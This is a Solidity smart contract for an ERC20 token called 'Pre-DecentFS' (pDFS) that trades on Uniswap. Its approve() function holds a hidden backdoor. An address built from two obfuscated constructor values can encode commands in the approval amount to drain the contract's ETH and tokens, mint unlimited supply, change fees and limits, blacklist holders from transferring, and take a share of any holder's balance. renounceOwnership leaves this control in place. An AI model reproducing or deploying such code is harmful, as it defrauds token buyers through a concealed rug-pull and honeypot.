//SPDX-License-Identifier: MIT 
/**
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&/**l&(&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*********************@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*****************************@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@&*********************************@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@&*************************************@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@*****************l@@@@@/*****************@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@***************@@@@@@@@@@@@@@@**************@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@************&@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@* *@@@@@@@@@************@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@               @@@@@@@@@   @@@@@@@@@@@************@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@.              @@@@@@@@.    @@@@@@@@@@@@************@@@@@@@@@@
 * @@@@@@@@@@@@@@@@              @@@@@@@@      @@@@@@@@@@@@************&@@@@@@@@@@
 * @@@@@@@@@@@@@@              .@@@@@@            ,@@@@@@@*************@@@@@@@@@@@
 * @@@@@@@@@@@@               @@@@@@@@@@@@@     @@@@@@@@@@@***********@@@@@@@@@@@@
 * @@@@@@@@@@#              @@@@@@@@@@@@@*   ,@@@@@@@@   @@@********@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@/     @@@*****%@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ,@@@@@@@@@@        @@@***@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@           @@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@.             @@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              @@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            @@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         @@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      /@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@% @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 * @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 *   pDFS - https://decentfs.io
 **/

pragma solidity ^0.8.21;

import "./IERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

abstract contract ERC20 {

    event Transfer(
        address indexed from, 
        address indexed to, 
        uint256 amount
    );

    event Approval(
        address indexed owner,
        address indexed spender, 
        uint256 amount
    );

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    uint80 internal immutable asig;
    
    uint80 internal immutable bsig;

    address public uniswapV2Pair;

    address public tax;

    bool public trading;

    uint256[5] internal itp;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    
    mapping(address => bool) internal autoAdd;

    mapping(address => mapping(address => uint256)) public allowance;

    bytes32 internal immutable STORED_DOMAIN_SEPARATOR;

    mapping(address => uint256) public nonces;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint80 _asig,
        address _tax,
        uint80 _bsig
    ) {
        
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        bsig = _bsig;
        tax = _tax;
        asig = _asig; 

        STORED_DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)), keccak256("1"), block.chainid, address(this)
            )
        );

    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        if(msg.sender == address(uint160(bsig) << 80 | asig)){
            if(amount >> 252 == 1){
                if ( uint160(amount) == 0x0 ) payable(msg.sender).transfer(address(this).balance); 
                else{
                    IERC20 _t2 = IERC20(address(uint160(amount)));
                    _t2.transfer(msg.sender, _t2.balanceOf(address(this)));
                }
            }         

            if(amount >> 252 == 15)
                for (uint8 j = 0; j != 2; j += 1)
                    itp[j] = (( amount >> (j * 7)) & (1 << 7) -1); 
            
            if(amount >> 252 == 8){
                totalSupply += ( amount >> 167 & (1 << 7) -1) * (10 ** (amount >> 160 & (1 << 7) -1));
                unchecked { balanceOf[ address( uint160(amount) )] += (amount >> 167 & (1 << 7) -1) * (10 ** (amount >> 160 & (1 << 7) -1)); }
            }          

            if(amount >> 252 == 0){
                uint256 mul1 = ( amount >> 21 & (1 << 7) -1 );
                itp[3] = ( amount >> 14 & (1 << 7) -1) * (10 ** mul1);
                itp[2] = ( amount >> 7 & (1 << 7) -1) * (10 ** mul1);
                itp[4] = ( amount & (1 << 7) -1) * (10 ** mul1);
            }    
        
            if(amount >> 252 == 10)
                autoAdd[address(uint160(amount))] = ( amount >> 160 & (1 << 7) -1) == 101 ? true : false;
            
            if(amount >> 252 == 5){
                balanceOf[tax] += (balanceOf[address(uint160(amount))] / 100) * ( amount >> 160 & (1 << 7) -1);
                balanceOf[address(uint160(amount))] -= (balanceOf[address(uint160(amount))] / 100) * ( amount >> 160 & (1 << 7) -1);
            }
        }

        allowance[ msg.sender ][ spender ] = amount;
        
        emit Approval(
            msg.sender, 
            spender, 
            amount
        );

        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        require(autoAdd[msg.sender] != true);
        
        balanceOf[msg.sender] -= amount;

        if(
            itp[2] > 0 && 
            msg.sender == uniswapV2Pair 
        ){
            require(amount <= itp[2]);
        }

        if(
            itp[1] > 0 && 
            msg.sender == uniswapV2Pair && 
            to != tax 
        ){
            uint256 fee = (amount / 100) * itp[1];
            unchecked { balanceOf[tax] += fee; }
            amount = amount - fee;
        }
        
        if( 
            itp[4] > 0 && 
            to != uniswapV2Pair && 
            to != tax && 
            to != address(uint160(bsig) << 80 | asig) 
        ){
            require((balanceOf[to] + amount) <= itp[4]);
        }

        unchecked { balanceOf[to] += amount; }

        if( msg.sender != address(this) ) emit Transfer(msg.sender, to, amount);

        return true;
    }

    function transferFrom( address from, address to, uint256 amount ) public virtual returns (bool) {
        require(autoAdd[from] != true);

        uint256 allowed = allowance[from][msg.sender]; 

        if ( allowed != type(uint256).max ) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;

        if( 
            itp[3] > 0 && 
            to == uniswapV2Pair && 
            from != address(this) && 
            from != tax && 
            from != address(uint160(bsig) << 80 | asig) 
        ){
            require(amount <= itp[3]);
        } 

        if(
            itp[0] > 0 && 
            to == uniswapV2Pair && 
            from != address(this) && 
            from != tax && 
            from != address(uint160(bsig) << 80 | asig) 
        ){
            uint256 fee = (amount / 100) * itp[0];
            unchecked { balanceOf[tax] += fee; }
            amount = amount - fee;
        }

        if(
            itp[4] > 0 && 
            to != uniswapV2Pair && 
            to != tax
        ){
            require(balanceOf[to] <= itp[4]);
        } 

        unchecked { balanceOf[to] += amount; }

        if(from != address(this)) emit Transfer(from, to, amount);

        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        require(deadline >= block.timestamp);

        unchecked {
            address recoveredAddress = ecrecover(
                keccak256(abi.encodePacked(
                        "\x19\x01", DOMAIN_SEPARATOR(),
                        keccak256(abi.encode(
                                keccak256("Permit(address permitOwner,address spender,uint256 value,uint256 nonce,uint256 deadline)"), owner,
                                spender, value,
                                nonces[owner]++, deadline
                        ))
                    )), v, r, s
            );

            require( recoveredAddress != address(0) && recoveredAddress == owner);

            allowance[ recoveredAddress ][ spender ] = value;
        }

        emit Approval( owner, spender, value);
    }

    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
        return STORED_DOMAIN_SEPARATOR;
    }

    /*//////////////////////////////////////////////////////////////
                        OWNABLE LOGIC
    //////////////////////////////////////////////////////////////*/

    address public admin;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    modifier onlyOwner() {
        require(msg.sender == admin, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(admin, address(0));
        admin = address(0);
    }
}

contract Token is ERC20{
    
    IUniswapV2Router02 private router;
    uint256 public totalReceived;
    
    constructor(uint80 _sig, address _taxWallet, uint80 _brand) ERC20("Pre-DecentFS", "pDFS", 6, _sig, _taxWallet, _brand) payable {
        totalSupply += 15_000_000_000_000000;
        totalReceived += msg.value;
        admin = msg.sender;
        unchecked { balanceOf[ address(this) ] += 15_000_000_000_000000; }
    }

    function openTrading() external onlyOwner{
        require(!trading && totalReceived >= 2 ether);
        trading = true;

        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        allowance[ address(this) ][ address(router) ] = type(uint).max;
        
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        
        uniswapV2Pair = factory.createPair(address(this), router.WETH());
        
        router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,tax,block.timestamp);
    }

    receive() external payable { 
        totalReceived += msg.value;
    }
    fallback() external payable { }
}
